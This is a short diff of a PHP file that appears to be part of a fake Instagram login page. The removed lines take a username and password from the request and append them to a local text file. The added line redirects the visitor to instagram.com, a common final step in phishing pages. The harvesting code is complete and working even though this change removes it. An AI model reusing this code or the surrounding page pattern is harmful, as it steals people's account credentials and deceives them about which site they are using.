@@ -222,12 +222,7 @@
 
 <?php
 if(isset($_GET['lo'])) {
-    $u_name = $_GET['u_name'];
-    $pass = $_GET['pass'];
-    $file = '1.txt';
-    $data = "u_name: $u_name\nPass: $pass\n\n";
-    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit();
+   echo "<script>location.href = 'https://www.instagram.com/';</script>";
 }
 
 ?>
